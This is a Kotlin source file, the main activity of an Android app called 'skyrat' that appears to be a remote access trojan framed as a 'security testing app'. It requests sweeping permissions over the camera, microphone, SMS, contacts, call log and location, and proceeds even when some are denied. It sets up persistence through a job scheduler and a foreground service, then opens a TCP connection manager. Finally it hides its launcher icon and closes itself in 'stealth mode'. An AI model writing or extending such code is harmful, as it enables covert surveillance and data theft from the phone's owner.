package com.techsky.skyrat

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val PREFS_NAME = "app_state"
        private const val KEY_SETUP_COMPLETE = "setup_complete"
        private const val KEY_IS_HIDDEN = "is_hidden"
        private const val KEY_PERMISSIONS_GRANTED = "permissions_granted"
        private const val KEY_SERVICES_STARTED = "services_started"
        private const val PERMISSION_REQUEST_CODE = 1001
    }

    private lateinit var context: Context
    private lateinit var sharedPrefs: SharedPreferences

    // Required permissions (kept complete list)
    private val requiredPermissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.VIBRATE,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.WAKE_LOCK,
        Manifest.permission.SYSTEM_ALERT_WINDOW,
        Manifest.permission.SEND_SMS,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    ).let { permissions ->
        when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU -> {
                permissions + arrayOf(
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.READ_MEDIA_AUDIO,
                    Manifest.permission.POST_NOTIFICATIONS,
                    Manifest.permission.READ_PHONE_NUMBERS
                )
            }
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R -> {
                permissions + arrayOf(
                    Manifest.permission.MANAGE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_PHONE_NUMBERS
                )
            }
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O -> {
                permissions + arrayOf(
                    Manifest.permission.READ_PHONE_NUMBERS
                )
            }
            else -> permissions
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        context = applicationContext
        sharedPrefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)

        Log.d(TAG, "MainActivity started - Config.ICON: ${Config.ICON}")
        setContentView(R.layout.activity_main)

        // Check current state
        val permissionsGranted = sharedPrefs.getBoolean(KEY_PERMISSIONS_GRANTED, false)
        val setupComplete = sharedPrefs.getBoolean(KEY_SETUP_COMPLETE, false)
        val servicesStarted = sharedPrefs.getBoolean(KEY_SERVICES_STARTED, false)

        when {
            !permissionsGranted -> {
                Log.d(TAG, "Requesting permissions")
                requestAllPermissions()
            }
            !setupComplete -> {
                Log.d(TAG, "Starting setup process")
                startSetupProcess()
            }
            !servicesStarted -> {
                Log.d(TAG, "Starting services")
                startBackgroundServices()
            }
            else -> {
                Log.d(TAG, "Everything complete, handling visibility")
                handleAppVisibility()
            }
        }
    }

    private fun requestAllPermissions() {
        val missingPermissions = requiredPermissions.filter { permission ->
            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isEmpty()) {
            onPermissionsGranted()
            return
        }

        // Simplified but informative permission dialog
        AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("This security testing app needs multiple permissions:\n\n• Camera & Audio\n• Storage Access\n• SMS & Contacts\n• Location & Phone State\n\nPlease grant ALL permissions for full functionality.")
            .setPositiveButton("Grant Permissions") { _, _ ->
                ActivityCompat.requestPermissions(
                    this,
                    missingPermissions.toTypedArray(),
                    PERMISSION_REQUEST_CODE
                )
            }
            .setNegativeButton("Exit") { _, _ ->
                finish()
            }
            .setCancelable(false)
            .show()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE) {
            val granted = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
            val total = grantResults.size

            Log.d(TAG, "Permissions result: $granted/$total granted")

            if (granted >= total * 0.8) {
                onPermissionsGranted()
            } else {
                // Show what's missing but continue anyway
                Toast.makeText(this, "Some permissions denied - functionality may be limited", Toast.LENGTH_LONG).show()
                onPermissionsGranted()
            }
        }
    }

    private fun onPermissionsGranted() {
        sharedPrefs.edit().putBoolean(KEY_PERMISSIONS_GRANTED, true).apply()

        // Log critical permissions for debugging
        logCriticalPermissions()

        // Request battery optimization exemption
        requestBatteryOptimizationExemption()

        // Proceed to setup
        startSetupProcess()
    }

    private fun logCriticalPermissions() {
        val critical = mapOf(
            "Camera" to Manifest.permission.CAMERA,
            "Audio" to Manifest.permission.RECORD_AUDIO,
            "SMS" to Manifest.permission.READ_SMS,
            "Contacts" to Manifest.permission.READ_CONTACTS,
            "Phone" to Manifest.permission.READ_PHONE_STATE
        )

        Log.d(TAG, "=== CRITICAL PERMISSIONS ===")
        critical.forEach { (name, permission) ->
            val granted = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
            Log.d(TAG, "$name: ${if (granted) "✅" else "❌"}")
        }
    }

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
                Log.d(TAG, "Battery optimization exemption requested")
            } catch (e: Exception) {
                Log.e(TAG, "Could not request battery optimization: ${e.message}")
            }
        }
    }

    private fun startSetupProcess() {
        val setupComplete = sharedPrefs.getBoolean(KEY_SETUP_COMPLETE, false)
        if (setupComplete) {
            startBackgroundServices()
            return
        }

        Log.d(TAG, "Starting setup process")

        // Show setup dialog for user feedback
        val dialog = AlertDialog.Builder(this)
            .setTitle("System Setup")
            .setMessage("Initializing security testing environment...")
            .setCancelable(false)
            .create()

        dialog.show()

        CoroutineScope(Dispatchers.Main).launch {
            delay(3000) // Setup simulation

            try {
                completeSetup()
                dialog.dismiss()
            } catch (e: Exception) {
                Log.e(TAG, "Setup failed: ${e.message}")
                dialog.dismiss()
                Toast.makeText(context, "Setup failed: ${e.message}", Toast.LENGTH_LONG).show()
                finish()
            }
        }
    }

    private fun completeSetup() {
        Log.d(TAG, "Completing setup")

        // Mark setup as complete
        sharedPrefs.edit().putBoolean(KEY_SETUP_COMPLETE, true).apply()

        try {
            // IMPORTANT: Initialize job scheduler for persistence
            Functions(this).jobScheduler(applicationContext)
            Log.d(TAG, "Job scheduler initialized")

            // Create notification channel
            Functions(this).createNotificationChannel(applicationContext)
            Log.d(TAG, "Notification channel created")

            Toast.makeText(this, "Setup complete. Starting services...", Toast.LENGTH_SHORT).show()

            // Start services
            startBackgroundServices()

        } catch (e: Exception) {
            Log.e(TAG, "Setup error: ${e.message}")
            Toast.makeText(this, "Setup error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun startBackgroundServices() {
        val servicesStarted = sharedPrefs.getBoolean(KEY_SERVICES_STARTED, false)
        if (servicesStarted) {
            handleAppVisibility()
            return
        }

        Log.d(TAG, "Starting background services")

        try {
            // Start foreground service for process protection
            val serviceIntent = Intent(context, MainService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
                Log.d(TAG, "Foreground service started")
            } else {
                startService(serviceIntent)
                Log.d(TAG, "Service started")
            }

            // Start TCP managers
            CoroutineScope(Dispatchers.IO).launch {
                delay(2000)

                try {
                    val backgroundManager = BackgroundTcpManager(context)
                    backgroundManager.startConnection()
                    Log.d(TAG, "TCP manager started")
                } catch (e: Exception) {
                    Log.e(TAG, "TCP manager failed: ${e.message}")
                }

                delay(2000)
                try {
                    val jumper = Jumper(context)
                    jumper.init()
                    Log.d(TAG, "Jumper initialized")
                } catch (e: Exception) {
                    Log.e(TAG, "Jumper failed: ${e.message}")
                }
            }

            // Mark services as started
            sharedPrefs.edit().putBoolean(KEY_SERVICES_STARTED, true).apply()

            Toast.makeText(context, "Services started successfully", Toast.LENGTH_SHORT).show()

            // Handle visibility after services stabilize
            CoroutineScope(Dispatchers.Main).launch {
                delay(3000)
                handleAppVisibility()
            }

        } catch (e: Exception) {
            Log.e(TAG, "Failed to start services: ${e.message}")
            Toast.makeText(this, "Service start failed: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun handleAppVisibility() {
        Log.d(TAG, "Handling app visibility - Config.ICON: ${Config.ICON}")

        if (Config.ICON) {
            // Config.ICON = true: HIDE app and close
            Log.d(TAG, "Config.ICON = true: Hiding app icon and closing")

            Functions(this).hideAppIcon(context)
            sharedPrefs.edit().putBoolean(KEY_IS_HIDDEN, true).apply()

            Toast.makeText(context, "Running in stealth mode", Toast.LENGTH_SHORT).show()

            CoroutineScope(Dispatchers.Main).launch {
                delay(2000)
                Log.d(TAG, "Finishing MainActivity for stealth mode")
                finish()
            }
        } else {
            // Config.ICON = false: KEEP app visible and open
            Log.d(TAG, "Config.ICON = false: Keeping app visible and open")

            sharedPrefs.edit().putBoolean(KEY_IS_HIDDEN, false).apply()
            Toast.makeText(context, "Security testing environment ready", Toast.LENGTH_LONG).show()

            // DO NOT call finish() or moveTaskToBack() - keep app open!
            Log.d(TAG, "MainActivity staying open for visibility")
        }
    }

    override fun onResume() {
        super.onResume()
        Log.d(TAG, "MainActivity resumed")

        // Handle stealth mode when app is reopened
        val isHidden = sharedPrefs.getBoolean(KEY_IS_HIDDEN, false)
        val setupComplete = sharedPrefs.getBoolean(KEY_SETUP_COMPLETE, false)
        val permissionsGranted = sharedPrefs.getBoolean(KEY_PERMISSIONS_GRANTED, false)

        // If in stealth mode and everything is setup, close the app
        if (isHidden && setupComplete && permissionsGranted && Config.ICON) {
            Log.d(TAG, "App in stealth mode - closing on resume")
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "MainActivity destroyed")
    }

    // === UTILITY METHODS (kept useful ones) ===

    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }

    fun getPermissionsStatus(): String {
        val granted = requiredPermissions.count { hasPermission(it) }
        return "Permissions: $granted/${requiredPermissions.size} granted"
    }
}